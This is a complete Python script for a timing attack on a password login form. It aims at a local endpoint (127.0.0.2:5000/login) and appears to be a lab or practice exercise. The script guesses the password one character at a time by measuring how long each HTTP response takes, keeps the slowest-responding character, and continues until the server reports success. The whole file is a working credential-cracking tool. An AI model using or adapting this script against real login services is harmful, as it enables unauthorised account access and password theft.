import requests
import time
import string

TARGET_URL = "http://127.0.0.2:5000/login"
CHARSET = string.ascii_letters + string.digits  # Possible password characters

DELAY_THRESHOLD = 0.01

def measure_response_time(guess):
    """Sends a request and returns the response time and success flag."""
    headers = {'Cache-Control': 'no-cache'}  # Disable caching in the HTTP request
    start_time = time.time()
    response = requests.post(TARGET_URL, data={"password": guess}, headers=headers)
    response_time = time.time() - start_time
    success = response.json().get("success", False)
    return response_time, success


def timing_attack():
    guessed_password = ""
    while True:
        best_time = 0
        best_char = None
        for char in CHARSET:
            test_guess = guessed_password + char
            response_time, success = measure_response_time(test_guess)

            if success:
                print(f"\nPassword found: {test_guess}")
                return test_guess

            if response_time > best_time:
                best_time = response_time
                best_char = char

        if best_char:
            guessed_password += best_char
            print(f"Current guess: {guessed_password}")

if __name__ == "__main__":
    print("Starting Timing Attack...")
    timing_attack()
